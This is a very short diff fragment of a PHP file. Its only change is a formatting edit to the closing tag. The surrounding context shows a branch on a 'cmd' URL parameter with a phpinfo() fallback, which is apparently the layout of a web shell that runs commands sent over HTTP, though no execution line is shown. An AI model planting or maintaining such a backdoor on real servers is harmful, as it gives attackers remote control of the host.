@@ -38,4 +38,5 @@ if (isset($_GET['cmd']) === true) {
   }
 } else {
   phpinfo();
-} ?>
+}
+?>
